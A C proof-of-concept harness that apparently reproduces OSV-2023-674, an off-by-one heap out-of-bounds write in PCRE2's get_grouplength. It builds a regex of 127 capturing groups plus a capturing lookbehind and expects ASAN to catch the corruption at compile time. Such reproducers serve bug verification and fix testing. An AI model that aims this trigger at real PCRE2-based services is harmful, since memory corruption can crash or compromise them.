/*
 * PoC harness for OSV-2023-674: heap-OOB WRITE in get_grouplength
 *
 * Bug: Off-by-one in groupinfo buffer allocation in pcre2_compile.c
 * The allocation is (2 * cb.bracount + 1)*sizeof(uint32_t) but should be
 * (2 * (cb.bracount + 1))*sizeof(uint32_t).
 *
 * get_grouplength writes to groupinfo[2*group] and groupinfo[2*group+1].
 * When group == bracount, the write to groupinfo[2*bracount+1] is OOB
 * because only 2*bracount+1 elements are allocated (indices 0..2*bracount).
 *
 * Trigger conditions:
 *   1. bracount >= GROUPINFO_DEFAULT_SIZE/2 (128) -> heap allocation path
 *   2. has_lookbehind == TRUE -> enters check_lookbehinds
 *   3. The lookbehind contains a capturing group or backreference whose
 *      group number equals bracount -> get_grouplength writes OOB
 *
 * Strategy: Create 127 capturing groups "(a)" before the lookbehind,
 * then put one more capturing group inside the lookbehind: (?<=(.))
 * This makes bracount=128 and calls get_grouplength(group=128).
 *
 * Vulnerable commit: 5f77d022733a5b7e2ff1e3d80b547c0d89811efe
 * Fix commit: fb1c7d27db09a4d0a2b6e1486c4f1a4d332e8b8c
 */

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    int errorcode;
    PCRE2_SIZE erroroffset;

    /* Build pattern: 127 x "(a)" then "(?<=(.))x"
     * This gives bracount = 128, with group 128 inside a lookbehind.
     * The "x" after the lookbehind is just a literal to match against.
     */
    char pattern[8192];
    int pos = 0;
    int ngroups_before = 127;  /* groups before the lookbehind */

    for (int i = 0; i < ngroups_before; i++) {
        pos += sprintf(pattern + pos, "(a)");
    }
    /* Add lookbehind with a capturing group inside it.
     * This becomes group 128. The lookbehind checks that the preceding
     * character matches (.) which is any single character - fixed length 1.
     * get_grouplength will be called for group 128 during
     * set_lookbehind_lengths -> get_branchlength -> get_grouplength.
     */
    pos += sprintf(pattern + pos, "(?<=(.))x");

    printf("[*] OSV-2023-674 PoC: heap-OOB WRITE in get_grouplength\n");
    printf("[*] Pattern length: %d bytes\n", pos);
    printf("[*] Expected bracount: %d (>= 128 triggers heap alloc)\n",
           ngroups_before + 1);
    printf("[*] Lookbehind contains group %d\n", ngroups_before + 1);
    printf("[*] Buggy alloc: (2*%d+1)*4 = %d bytes (%d uint32 elements)\n",
           ngroups_before + 1,
           (int)((2 * (ngroups_before + 1) + 1) * sizeof(uint32_t)),
           2 * (ngroups_before + 1) + 1);
    printf("[*] OOB write at index: 2*%d+1 = %d (max valid: %d)\n",
           ngroups_before + 1,
           2 * (ngroups_before + 1) + 1,
           2 * (ngroups_before + 1));
    printf("[*] Compiling pattern...\n");
    fflush(stdout);

    pcre2_code *code = pcre2_compile(
        (PCRE2_SPTR)pattern, (PCRE2_SIZE)pos,
        0,  /* no special options */
        &errorcode, &erroroffset, NULL);

    if (!code) {
        PCRE2_UCHAR buffer[256];
        pcre2_get_error_message(errorcode, buffer, sizeof(buffer));
        printf("[!] Compile failed at offset %zu: %s\n",
               (size_t)erroroffset, buffer);
        printf("[*] This may still have triggered the OOB write before "
               "the error was detected.\n");
        return 1;
    }

    printf("[!] Compile succeeded - ASAN should have detected the OOB "
           "write during compilation\n");
    pcre2_code_free(code);
    return 0;
}
